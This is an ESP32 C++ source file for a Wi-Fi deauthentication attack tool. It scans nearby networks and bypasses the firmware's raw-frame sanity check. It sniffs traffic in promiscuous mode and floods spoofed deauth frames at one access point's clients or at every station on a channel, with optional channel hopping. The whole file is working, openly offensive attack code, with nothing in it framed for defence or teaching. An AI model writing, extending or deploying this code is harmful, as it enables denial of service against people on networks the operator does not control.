#include "deauth.h"

// ─── ESP-IDF raw TX ──────────────────────────────────────────────────────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buf, int len, bool en_sys_seq);

static const wifi_promiscuous_filter_t PKT_FILTER = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// ─── STATE ───────────────────────────────────────────────────────────────────
deauth_frame_t deauth_frame;
int            deauth_type         = DEAUTH_TYPE_SINGLE;
int            eliminated_stations = 0;
bool           deauth_running      = false;

NetworkInfo    foundNetworks[MAX_NETWORKS];
int            foundCount          = 0;

// hop state
static bool          hop_active   = false;
static int           hop_chan     = 1;
static unsigned long hop_dwell    = 500;
static unsigned long hop_last_ts  = 0;

// ─── SNIFFER CALLBACK ────────────────────────────────────────────────────────
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const mac_hdr_t *hdr = (mac_hdr_t *)raw->payload;

  if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
    memcpy(deauth_frame.station, hdr->src, 6);
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);

  } else {
    if (memcmp(hdr->dest, hdr->bssid, 6) != 0) return;
    if (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0) return;
    memcpy(deauth_frame.station,      hdr->src,  6);
    memcpy(deauth_frame.access_point, hdr->dest, 6);
    memcpy(deauth_frame.sender,       hdr->dest, 6);
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
  }

  eliminated_stations++;
  DBG_PRINTF("[DEAUTH] %d frames → %02X:%02X:%02X:%02X:%02X:%02X (total: %d)\n",
    NUM_FRAMES_PER_DEAUTH,
    hdr->src[0], hdr->src[1], hdr->src[2],
    hdr->src[3], hdr->src[4], hdr->src[5],
    eliminated_stations);
}

// ─── PUBLIC API ──────────────────────────────────────────────────────────────

int scan_networks() {
  DBG_PRINTLN("[SCAN] Scanning...");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (n <= 0) { DBG_PRINTLN("[SCAN] Nothing found."); foundCount = 0; return 0; }

  foundCount = min(n, MAX_NETWORKS);
  DBG_PRINTF("[SCAN] Found %d network(s):\n", foundCount);
  DBG_PRINTLN("  ID | SSID                             | CH | RSSI | BSSID");
  DBG_PRINTLN("  ---+----------------------------------+----+------+------------------");
  for (int i = 0; i < foundCount; i++) {
    foundNetworks[i] = { WiFi.SSID(i), WiFi.BSSIDstr(i), WiFi.RSSI(i), WiFi.channel(i) };
    DBG_PRINTF("  %-2d | %-32s | %-2d | %-4d | %s\n",
      i + 1, foundNetworks[i].ssid.c_str(),
      foundNetworks[i].channel, foundNetworks[i].rssi,
      foundNetworks[i].bssid.c_str());
  }
  return foundCount;
}

void print_networks() {
  if (foundCount == 0) { DBG_PRINTLN("[INFO] No cached scan. Run scan_networks() first."); return; }
  DBG_PRINTF("[INFO] %d cached network(s):\n", foundCount);
  DBG_PRINTLN("  ID | SSID                             | CH | RSSI | BSSID");
  DBG_PRINTLN("  ---+----------------------------------+----+------+------------------");
  for (int i = 0; i < foundCount; i++)
    DBG_PRINTF("  %-2d | %-32s | %-2d | %-4d | %s\n",
      i + 1, foundNetworks[i].ssid.c_str(),
      foundNetworks[i].channel, foundNetworks[i].rssi,
      foundNetworks[i].bssid.c_str());
}

void start_deauth(int index, int attack_type, uint16_t reason) {
  if (deauth_running) { DBG_PRINTLN("[DEAUTH] Already running. Call stop_deauth() first."); return; }
  if (index < 0 || index >= foundCount) { DBG_PRINTLN("[DEAUTH] Bad index. Scan first."); return; }

  eliminated_stations = 0;
  deauth_type         = attack_type;
  deauth_running      = true;
  hop_active          = false;
  deauth_frame.reason = reason;

  // Copy target AP MAC into frame
  uint8_t *bssid = WiFi.BSSID(index);   // returns pointer into scan buffer
  memcpy(deauth_frame.access_point, bssid, 6);
  memcpy(deauth_frame.sender,       bssid, 6);

  DBG_PRINTF("[DEAUTH] Starting %s attack on: %s  ch=%d reason=%d\n",
    attack_type == DEAUTH_TYPE_SINGLE ? "SINGLE" : "ALL",
    foundNetworks[index].ssid.c_str(),
    foundNetworks[index].channel, reason);

  WiFi.mode(WIFI_MODE_STA);
  set_channel(foundNetworks[index].channel);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&PKT_FILTER);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  if (!deauth_running) { DBG_PRINTLN("[DEAUTH] Nothing running."); return; }
  esp_wifi_set_promiscuous(false);
  deauth_running = false;
  hop_active     = false;
  DBG_PRINTF("[DEAUTH] Stopped. Total bursts: %d\n", eliminated_stations);
}

void channel_hop_deauth(int index, int attack_type, uint16_t reason, unsigned long dwell_ms) {
  start_deauth(index, attack_type, reason);
  hop_active  = true;
  hop_dwell   = dwell_ms > 0 ? dwell_ms : 500;
  hop_chan    = 1;
  hop_last_ts = millis();
  set_channel(hop_chan);
  DBG_PRINTF("[HOP] Channel-hop started, dwell=%lu ms\n", hop_dwell);
}

void update_hop() {
  if (!hop_active) return;
  if (millis() - hop_last_ts >= hop_dwell) {
    hop_chan    = (hop_chan % CHANNEL_MAX) + 1;
    hop_last_ts = millis();
    set_channel(hop_chan);
  }
}

void set_channel(int channel) {
  if (channel < 1 || channel > CHANNEL_MAX) {
    DBG_PRINTF("[CHAN] Invalid channel %d\n", channel); return;
  }
  esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
  DBG_PRINTF("[CHAN] Channel → %d\n", channel);
}

int get_kick_count() { return eliminated_stations; }

void print_status() {
  DBG_PRINTLN("------------------------------");
  DBG_PRINTF("  Running : %s\n",   deauth_running ? "YES" : "NO");
  DBG_PRINTF("  Mode    : %s\n",   deauth_type == DEAUTH_TYPE_SINGLE ? "SINGLE" : "ALL");
  DBG_PRINTF("  Hop     : %s\n",   hop_active ? "YES" : "NO");
  if (hop_active) DBG_PRINTF("  Channel : %d\n", hop_chan);
  DBG_PRINTF("  Kicks   : %d\n",   eliminated_stations);
  DBG_PRINTLN("------------------------------");
}
